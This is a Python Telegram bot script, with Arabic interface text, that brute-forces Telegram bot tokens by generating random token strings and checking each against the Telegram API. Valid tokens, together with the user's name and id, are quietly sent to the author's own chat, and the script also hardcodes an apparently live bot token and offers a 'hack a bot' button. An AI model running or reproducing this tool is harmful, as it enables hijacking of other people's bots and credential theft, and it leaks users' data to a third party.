import os
try:
	import telebot,requests,time,random
	from telebot import types
except ImportError:
	os.system('pip install telebot')
	os.system('pip install requests')
	os.system('pip install time')
	os.system('pip install random')
	os.system('clear')
stop =True
tnt = '6047236106:AAHoFnt0UHoa2PwpMNozBVOvY3aUAL5cZQI'
bot = telebot.TeleBot(tnt)

@bot.message_handler(commands=['start'])
def start(me):
	if bot.get_chat_member(f"@d_xiimch",me.from_user.id).status == "left" or  bot.get_chat_member(f"@course_py",me.from_user.id).status == "left":
		den = types.InlineKeyboardButton('my channel', url='t.me/course_py')
		ka = types.InlineKeyboardButton('bot channel', url='t.me/d_xiimCH')
		kc = types.InlineKeyboardMarkup(row_width=2);kc.add(den, ka)
		bot.send_message(me.chat.id,f'''<strong>
عذرا عزيزي 📛
عليك الاشتراك بقناة المطور و قناة البوت فضلا
ليصلك كل جديد✨
</strong>
		''', parse_mode='html', reply_markup=kc)
	else:
		bot.send_message(me.chat.id,text='''		
اهلا بك 
البوت مخصص لصيد توكنات عشوائي
ارسل [ /hit ]  لبدء الفحص
	''')
@bot.message_handler(commands=['hit'])
def hit(mee):
	global stop
	if bot.get_chat_member(f"@d_xiimch",mee.from_user.id).status == "left" or  bot.get_chat_member(f"@course_py",mee.from_user.id).status == "left":
		den = types.InlineKeyboardButton('my channel', url='t.me/course_py')
		ka = types.InlineKeyboardButton('bot channel', url='t.me/d_xiimCH')
		kc = types.InlineKeyboardMarkup(row_width=2);kc.add(den, ka)
		bot.send_message(mee.chat.id,f'''<strong>
عذرا عزيزي 📛
عليك الاشتراك بقناة المطور و قناة البوت فضلا
ليصلك كل جديد✨
</strong>
''', parse_mode='html', reply_markup=kc)
	else:
		dev = types.InlineKeyboardButton('بدء الصيد 👨‍💻', callback_data='dev')
		cc = types.InlineKeyboardButton('تهكير بوت 👨‍💻',callback_data='cc')
		m = types.InlineKeyboardMarkup(row_width=2);m.add(dev,cc)
		bot.send_message(mee.chat.id,text='choice...', reply_markup=m)
@bot.callback_query_handler(func=lambda call:True)
def asd(call):
	if call.data == 'dev':
		us = call.from_user.id
		asf = [1433763087,2112066248,5952149947,1410377361,1253625371,5824943292,5903160198,1025792859,2116409671,6274883941,708441197,6044283982,5625626952,6273507425,5809861669,936441187,5225076831,6064817004,980833331,5951464891,5110919325,991561009,2072356046,1202001099,5977257530,749219602,5402196151,6019145503]
		if us in asf:
			id_derk = 5903160198
			last_name = call.from_user.full_name
			username = call.from_user.username
			user_idnc = call.from_user.id
			e = f'''
❖ - عضو يستخدم البوت
معلوماته
name : {last_name}
user : @{username}
id : {user_idnc}
    '''
			send_info = requests.post(f"https://api.telegram.org/bot{tnt}/sendMessage?chat_id={id_derk}&text={e}")
			a = 'AAG', 'AAF', 'AAH'
			aa = '0987654321'
			aaa = '651'
			aaaa = 'qwertyuioplkjhgfdsazxcvbnm1098765432QWERTYUIOPLKJHGFDSAZXCVBNM_-'
			jk =0
			dp =0
			mc = types.InlineKeyboardMarkup(row_width=2)
			while True:
				b = random.choice(a)
				bb = ''.join(random.choice(aa)for i in range(9))
				bbb = ''.join(random.choice(aaa)for i in range(1))
				n = ''.join(random.choice(aaaa)for i in range(32))
				token = bbb + bb + ':' + b + n
				response=requests.get(url=f"https://api.telegram.org/bot{token}/getme").json()
				try:
					result = response['result']
					id = result['id']
					is_bot = result['is_bot']
					first_name = result['first_name']
					username = result['username']
					group = result['can_join_groups']
					pro = types.InlineKeyboardButton(' develover   ϟ ', url='t.me/d_xiim')
					ma = types.InlineKeyboardMarkup(row_width=1)
					ma.add(pro)
					bot.send_message(call.chat.id,text=f'''
	<strong>
❖ - <s>New Hit Token </s>🎭
	
[⌯] Token ⌯ </strong><code>{token}</code><strong>
[⌯] First Name ⌯ {first_name}
[⌯] UserName ⌯ </strong>@{username}<strong>
[⌯] Id ⌯ </strong><code>{id}</code><strong>
[⌯] Is Bot ⌯ {is_bot}
[⌯] Can Join Group ⌯ {group}
	</strong>
dev👨‍💻 @d_xiim
	
				''', parse_mode='html', reply_markup=ma)
					bot.send_message(call.chat.id,text='تم انتهاء الفحص...')
					id_d= 5903160198
					g = f'''
عضو قام بصيد توكن

❖ - New Hit Token 🎭
	
[⌯] Token ⌯ {token}
[⌯] First Name ⌯ {first_name}
[⌯] UserName ⌯ @{username}
[⌯] Id ⌯ {id}
[⌯] Is Bot ⌯ {is_bot}
[⌯] Can Join Group ⌯ {group}

dev👨‍💻 @d_xiim
					'''
					send_hit = requests.post(f"https://api.telegram.org/bot{tnt}/sendMessage?chat_id={id_d}&text={g}")
					jk +=1
					return
				except:
					dp +=1
				ass = types.InlineKeyboardButton(f'hit token : {jk}', callback_data='ass')
				xnxx = types.InlineKeyboardButton(f'Bad Token : {dp}',callback_data='xnxx')
				mar = types.InlineKeyboardMarkup(row_width=2)
				tt = types.InlineKeyboardButton(f'{token}', callback_data='tt')
				mar.add(ass,xnxx,tt)
				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
	❖ - بدء الصيد الرجاء الانتظار 
	</strong>
			''', parse_mode='html', reply_markup=mar)
		elif call.data == 'stopp':
			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
	❖ - تم ايقاف الفحص
	</strong>
			''', parse_mode='html')
			return
		elif call.data == 'cc':
			bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
	❖ - هذه القسم في صيانة 🛠️🤖
	</strong>
			''', parse_mode='html')
		else:
			pass
bot.polling(True)